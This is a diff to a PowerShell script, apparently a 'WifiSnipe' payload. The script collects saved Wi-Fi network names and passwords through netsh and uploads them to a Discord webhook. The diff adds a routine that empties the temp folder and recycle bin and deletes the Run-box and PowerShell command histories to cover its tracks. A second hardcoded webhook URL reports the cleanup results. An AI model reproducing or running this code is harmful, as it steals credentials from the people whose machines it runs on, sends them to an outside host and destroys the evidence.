@@ -4,6 +4,14 @@ $Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddre
 
 # Get Wifi SSIDs and Passwords	
 $WLANProfileNames =@()
+if ($WLANProfileNames -eq '')
+{
+    Write-Output "No Wifi networks available on this device"
+} 
+else
+{
+    Write-Output "Wifi networks available on this device"
+}
 
 #Get all the WLAN profile names
 $Output = netsh.exe wlan show profiles | Select-String -pattern " : "
@@ -34,7 +42,7 @@ Foreach($WLANProfileName in $WLANProfileNames){
 return $WLANProfileObjects
 }
 
-function Upload-Discord {
+function UploadDiscord {
 
 [CmdletBinding()]
 param (
@@ -57,8 +65,88 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
+
+function CleaningTraceDiscord {
+
+    [CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$textCTD 
+)
+
+    $hookurlCTD = 'https://discord.com/api/webhooks/1044485702794084455/LX6w6wIM008OcwqYx62eaZnSFvYZnnVEpmD0C6UFGgLOsHQe2F1mP85H3X6H_cinAu5l'
+
+    $BodyCTD = @{
+        'username' = 'WifiSnipeCleaner'
+        'content' = $textCTD
+    }
+
+    if (-not ([string]::IsNullOrEmpty($textCTD))){
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurlCTD  -Method Post -Body ($BodyCTD | ConvertTo-Json)};
+}
+
+
+function CleanExfil { 
+
+    # empty temp folder
+    $rmTemp = Remove-Item $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+        if ($rmTemp -eq "error")
+    {
+        Write-Output "failed to remove temp"
+    }
+    else
+    {
+        Write-Output "completed temp removal"
+    }
+    
+    # delete run box history
+    $rmRunBoxHist = reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+    
+    if ($rmRunBoxHist -eq "error")
+    {
+        Write-Output "failed to remove run box history"
+    }
+    else
+    {
+        Write-Output "completed run box history removal"
+    }
+
+    # Delete powershell history
+    
+    $rmPShellHist = Remove-Item (Get-PSreadlineOption).HistorySavePath
+   
+    if ($rmPShellHist -eq "error")
+    {
+        Write-Output "failed to remove Powershell history"
+    }
+    else
+    {
+        Write-Output "completed Powershell history removal"
+    }   
+
+    # Empty recycle bin
+    $EmpRecBin = Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+    if ($EmpRecBin -eq "error")
+    {
+        Write-Output "failed to empty recycling bin"
+    }
+    else
+    {
+        Write-Output "completed emptying recycling bin"
+    }
+    
+}
+
 $Networks = Get-Networks
 
 $Networks = Out-String -InputObject $Networks
 
-Upload-Discord -text $Networks
+UploadDiscord -text $Networks
+
+$CleanExfilDiscord = CleanExfil
+
+$CleanExfilDiscordStr = Out-String -InputObject $CleanExfilDiscord
+
+CleaningTraceDiscord -text $CleanExfilDiscordStr
